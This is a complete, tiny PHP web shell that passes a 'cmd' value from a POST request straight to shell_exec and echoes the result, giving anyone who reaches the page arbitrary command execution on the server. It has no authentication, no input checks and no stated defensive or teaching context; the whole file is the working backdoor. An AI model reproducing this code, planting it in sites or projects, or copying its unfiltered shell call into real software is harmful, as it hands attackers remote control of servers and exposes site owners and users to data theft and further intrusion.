<?php
$cmd = $_POST['cmd'];
$output = shell_exec($cmd);
echo "<pre>$output</pre>"; 
?>
